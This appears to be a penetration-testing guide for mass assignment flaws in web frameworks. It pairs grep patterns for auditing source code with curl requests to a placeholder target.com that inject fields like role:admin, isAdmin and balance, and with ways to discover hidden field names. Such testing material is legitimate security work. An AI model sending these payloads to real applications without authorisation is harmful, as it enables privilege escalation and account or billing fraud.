# VULN MODULE — Mass Assignment & Parameter Binding
# Asset: webapp (Rails, Laravel, Spring, Django, Express)
# CWE-915 | Report prefix: WEB-MASS

## THREAT MODEL

Mass assignment occurs when a framework automatically binds HTTP parameters
to model/object attributes without an allowlist. Attackers inject unexpected
fields (role, admin, balance) that the server applies to the database object.

## WHITEBOX PATTERNS

```bash
# Rails (attr_accessible missing or attr_protected misuse)
grep -rn "attr_accessible\|attr_protected\|strong_parameters\|permit\b" \
  --include="*.rb"
# Rails 4+: params.require(:user).permit(:name) — check what's permitted

# Laravel ($fillable vs $guarded)
grep -rn "\$fillable\|\$guarded" --include="*.php"
# $guarded = [] means everything is fillable = dangerous

# Spring (@ModelAttribute, @RequestBody binding)
grep -rn "@ModelAttribute\|@RequestBody" --include="*.java" -A10 | \
  grep -v "@JsonIgnore\|@JsonProperty\|setAllowedFields"

# Django (ModelForm)
grep -rn "class.*ModelForm\|fields.*=.*__all__" --include="*.py"
# fields = '__all__' = mass assignment risk

# Express/Node (body directly to DB)
grep -rn "\.create(req\.body\|\.update.*req\.body\|\.save.*req\.body" \
  --include="*.js" --include="*.ts"
```

## TESTING

```bash
# Find what fields the model accepts by reading API docs, registration forms,
# JS source, or error messages, then inject additional fields

# Registration endpoint — inject role/admin
curl -s -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","password":"Test1234!","role":"admin","isAdmin":true,"verified":true,"balance":9999}'

# Profile update — inject fields not shown in UI
curl -s -X PUT https://target.com/api/users/me \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name":"test","role":"admin","subscription_tier":"enterprise","credit":1000}'

# After request, verify: did role/balance/tier change?
curl -s https://target.com/api/users/me -H "Authorization: Bearer TOKEN" | \
  python3 -m json.tool | grep -i "role\|admin\|balance\|tier"
```

## FIELD DISCOVERY

```bash
# Extract possible fields from JS source
grep -rn "role\|admin\|isAdmin\|verified\|confirmed\|balance\|credit\|tier\|plan\|permission" \
  ./src --include="*.js" | grep -v "node_modules"

# From API documentation or Swagger
curl -s https://target.com/api-docs | python3 -m json.tool | grep -A5 "properties"

# From error messages — send invalid types to trigger validation errors
curl -s -X POST https://target.com/api/users \
  -d '{"role": 999}' | grep -i "invalid\|expected\|string\|boolean"
# Error message reveals field names and expected types
```
